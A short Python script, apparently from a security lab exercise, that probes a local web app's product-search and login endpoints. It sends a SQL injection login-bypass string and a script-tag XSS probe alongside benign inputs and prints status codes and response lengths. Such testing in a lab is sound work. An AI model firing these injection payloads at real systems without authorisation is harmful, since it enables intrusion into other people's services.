import requests

BASE_URL = "http://localhost:3000"
ENDPOINTS = ["/rest/products/search", "/rest/user/login"]
PAYLOADS = ["apple", "test", "' OR 1=1--", "<script>alert(1)</script>"]

print("--- Running Part 2: HTTP Endpoint Reconnaissance ---\n")

for path in ENDPOINTS:
    url = BASE_URL + path
    for p in PAYLOADS:
        try:
            if "search" in path:
                res = requests.get(url, params={"q": p}, timeout=5)
                method = "GET"
            else:
                res = requests.post(url, json={"email": p, "password": p}, timeout=5)
                method = "POST"

            print(f"Endpoint Tested : {path}")
            print(f"HTTP Method     : {method}")
            print(f"Payload Used    : {p}")
            print(f"Status Code     : {res.status_code}")
            print(f"Response Length : {len(res.text)}")
            print("-" * 40)
        except Exception as e:
            print(f"Error testing {path}: {e}")
            